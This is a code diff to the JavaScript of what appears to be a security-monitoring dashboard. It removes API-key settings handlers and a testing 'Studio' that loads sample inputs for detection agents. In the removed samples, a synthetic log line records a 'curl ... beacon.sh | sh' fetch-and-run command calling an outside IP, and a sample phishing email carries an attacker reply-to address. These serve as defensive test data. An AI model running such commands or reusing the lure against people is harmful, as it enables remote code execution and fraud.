@@ -21,7 +21,7 @@ document.addEventListener("DOMContentLoaded", () => {
     loadAgentMesh();
     loadContainmentLedger();
     setupEventListeners();
-    setupStudio();
+
 
     // Telemetry polling loop every 5s
     setInterval(() => {
@@ -336,83 +336,11 @@ function setupEventListeners() {
         btnRunSim.addEventListener("click", triggerAttackSimulation);
     }
 
-    // Save Keys Handlers
-    initKeySettings();
+    // Initialize map and chart
+    initLeafletAttackMap();
+    initChartJsVolume();
 }
 
-async function initKeySettings() {
-    try {
-        const res = await fetch("/api/settings/keys");
-        if (res.ok) {
-            const data = await res.json();
-            const badge = document.getElementById("badge-active-engine");
-            if (badge) {
-                badge.textContent = `Active: ${data.active_engine}`;
-                badge.style.color = data.active_engine !== "Local Heuristic Engine" ? "#34d399" : "#38bdf8";
-            }
-            if (document.getElementById("gemini-status-tag")) {
-                document.getElementById("gemini-status-tag").textContent = data.gemini_active ? "● ACTIVE & CONNECTED" : "● STANDALONE";
-                document.getElementById("gemini-status-tag").style.color = data.gemini_active ? "#10b981" : "#94a3b8";
-            }
-            if (document.getElementById("groq-status-tag")) {
-                document.getElementById("groq-status-tag").textContent = data.groq_active ? "● ACTIVE & CONNECTED" : "● STANDALONE";
-                document.getElementById("groq-status-tag").style.color = data.groq_active ? "#10b981" : "#94a3b8";
-            }
-        }
-    } catch (e) {
-        console.warn("Keys status check:", e);
-    }
-
-    // Bind save buttons
-    const btnSaveGemini = document.getElementById("btn-save-gemini");
-    if (btnSaveGemini) {
-        btnSaveGemini.addEventListener("click", async () => {
-            const val = document.getElementById("input-gemini-key")?.value || "";
-            await saveKeyToServer({ gemini_api_key: val }, "Google Gemini");
-        });
-    }
-
-    const btnSaveGroq = document.getElementById("btn-save-groq");
-    if (btnSaveGroq) {
-        btnSaveGroq.addEventListener("click", async () => {
-            const val = document.getElementById("input-groq-key")?.value || "";
-            await saveKeyToServer({ groq_api_key: val }, "Groq LLaMA 3.3");
-        });
-    }
-
-    const btnSaveVt = document.getElementById("btn-save-vt");
-    if (btnSaveVt) {
-        btnSaveVt.addEventListener("click", async () => {
-            const val = document.getElementById("input-vt-key")?.value || "";
-            await saveKeyToServer({ virustotal_api_key: val }, "VirusTotal");
-        });
-    }
-
-    const btnSaveAbuse = document.getElementById("btn-save-abuse");
-    if (btnSaveAbuse) {
-        btnSaveAbuse.addEventListener("click", async () => {
-            const val = document.getElementById("input-abuse-key")?.value || "";
-            await saveKeyToServer({ abuseipdb_api_key: val }, "AbuseIPDB");
-        });
-    }
-}
-
-async function saveKeyToServer(payload, providerName) {
-    try {
-        const res = await fetch("/api/settings/keys", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        });
-        if (res.ok) {
-            const data = await res.json();
-            showNotification(`${providerName} key saved successfully! Active engine: ${data.active_engine}`);
-            initKeySettings();
-        }
-    } catch (e) {
-        showNotification(`Error saving key: ${e.message}`);
-    }
-}
 
 
 /* API Calls & Renderers */
@@ -689,79 +617,7 @@ async function triggerAttackSimulation() {
 }
 
 /* Studio: Manual Dispatch & Testing */
-function setupStudio() {
-    const btnEmail = document.getElementById("btn-sample-email");
-    const btnLog = document.getElementById("btn-sample-log");
-    const btnIp = document.getElementById("btn-sample-ip");
-    const inputArea = document.getElementById("studio-input");
-    const btnSubmit = document.getElementById("btn-submit-studio");
-    const outputArea = document.getElementById("studio-output");
 
-    if (btnEmail && inputArea) {
-        btnEmail.addEventListener("click", () => {
-            inputArea.value = JSON.stringify({
-                task_type: "email",
-                sender: "payroll-alert@pay-support-portal.net",
-                subject: "CRITICAL: Urgent Payroll Account Verification Required Immediately",
-                headers: { "From": "HR Payroll", "Reply-To": "attacker-c2@185.220.101.5", "SPF": "SoftFail" },
-                body: "Urgent direct deposit verification required immediately: http://pay-support-portal.net/auth/verify?asset=10.0.4.10"
-            }, null, 2);
-        });
-    }
-
-    if (btnLog && inputArea) {
-        btnLog.addEventListener("click", () => {
-            inputArea.value = JSON.stringify({
-                task_type: "log",
-                entries: [
-                    "2026-08-07T18:28:10Z edge-gw sshd[4102]: Failed password for invalid user admin from 203.175.188.1 port 49152 ssh2",
-                    "2026-08-07T18:30:02Z edge-gw api-gateway[1029]: [CRITICAL] Memory heap corruption detected on /v1/auth/token handler (Buffer Overflow Canary Triggered) - SrcIP 203.175.188.1",
-                    "2026-08-07T18:31:45Z edge-gw sudo[5520]: user daemon : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'curl http://185.220.101.5/beacon.sh | sh'"
-                ]
-            }, null, 2);
-        });
-    }
-
-    if (btnIp && inputArea) {
-        btnIp.addEventListener("click", () => {
-            inputArea.value = JSON.stringify({
-                task_type: "ip_range",
-                range: "192.168.14.0/24"
-            }, null, 2);
-        });
-    }
-
-    if (btnSubmit && inputArea && outputArea) {
-        btnSubmit.addEventListener("click", async () => {
-            let parsed = {};
-            try {
-                parsed = JSON.parse(inputArea.value);
-            } catch (e) {
-                parsed = { text: inputArea.value };
-            }
-
-            btnSubmit.disabled = true;
-            btnSubmit.textContent = "DISPATCHING ACROSS AGENTS...";
-            try {
-                const res = await fetch("/api/dispatch", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(parsed)
-                });
-                const result = await res.json();
-                outputArea.textContent = JSON.stringify(result, null, 2);
-                loadAlerts(false);
-                loadDashboardStats();
-                showNotification(`Task dispatched successfully to ${result.routed_agent || 'domain agent'}`);
-            } catch (err) {
-                outputArea.textContent = `Error: ${err.message}`;
-            } finally {
-                btnSubmit.disabled = false;
-                btnSubmit.textContent = "RUN AGENT ANALYSIS";
-            }
-        });
-    }
-}
 
 function showNotification(msg) {
     const toast = document.createElement("div");
